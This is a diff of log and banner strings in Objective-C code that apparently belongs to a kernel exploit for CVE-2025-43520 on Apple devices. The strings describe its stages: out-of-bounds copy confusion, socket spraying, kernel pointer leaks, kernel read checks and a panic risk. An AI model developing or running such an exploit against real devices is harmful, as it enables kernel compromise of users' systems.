@@ -85,8 +85,8 @@ static void cs2_write_banner(void) {
     NSString *osv = cs2_sysctl_string(@"kern.osversion");
     const LabOffTab *off = LabOff();
     cs2_log("time %s", [[[NSDate date] description] UTF8String]);
-    cs2_log("=== cs2 session BUILD cs2-27.0-copy-lane ===");
-    cs2_log("core: 27.0 T8150 copy-confusion lane (calib FILE-COPY). hop-1 KEEP CLOSED.");
+    cs2_log("=== cs2 session BUILD cs2-27.0-partial ===");
+    cs2_log("core: 27.0 T8150 PARTIAL-window HIT (mixed qwords) + 8-try cap. hop-1 KEEP CLOSED.");
     cs2_log("machine=%s osversion=%s sku=%s",
             mach.UTF8String ?: "?", osv.UTF8String ?: "?",
             (off && off->tag) ? off->tag : "NULL");
@@ -120,7 +120,7 @@ static void cs2_write_banner(void) {
          }];
         cs2_log("boot-learn: lightsword_hot=%d lightsword_wrong=%d (WRONG=copy confusion of SOCK_DGRAM pages; FOREIGN/kptr still required)",
                 nh, nw);
-        cs2_log("look-for: pcb_start_offset, KERNEL POINTER (>>36==0xfffffff0), kernel_base, kread32==0xfeedfacf");
+        cs2_log("look-for: oob HIT kind=PARTIAL|WHOLESALE cls=KERNEL POINTER, pcb_start_offset, kernel_base, kread32==0xfeedfacf");
     }
 }
 
@@ -184,8 +184,8 @@ static BOOL lsword_arm_licensed(int *windows, BOOL *explicit_arm) {
                     wins);
             cs2_log("[LSWORD-ARM] phys_oob copy confusion PROVEN on this train (calib WRONG crossings;");
             cs2_log("[LSWORD-ARM] zero configd starvation across a dozen 400k-900k socket sprays).");
-            cs2_log("[LSWORD-ARM] Firing copy27 lane (success pwritev + 16KB iov). hop-1 KEEP CLOSED.");
-            cs2_log("[LSWORD-ARM] look-for: lane=copy27, oob HIT, pcb_start_offset, KERNEL POINTER, kread32==0xfeedfacf.");
+            cs2_log("[LSWORD-ARM] Firing copy27 PARTIAL-window HIT (mixed qwords, 8-try cap). hop-1 KEEP CLOSED.");
+            cs2_log("[LSWORD-ARM] look-for: oob HIT kind=PARTIAL cls=KERNEL POINTER, pcb_start_offset, kread32==0xfeedfacf.");
             cs2_log("[LSWORD-ARM] PANIC POSSIBLE — one tap per fresh boot. Ladder prints = dial-finder.");
         } else {
             cs2_log("[-] SKIP: CVE-2025-43520 patched on this build train (18.7.2/26.1+), no LightSword license.");
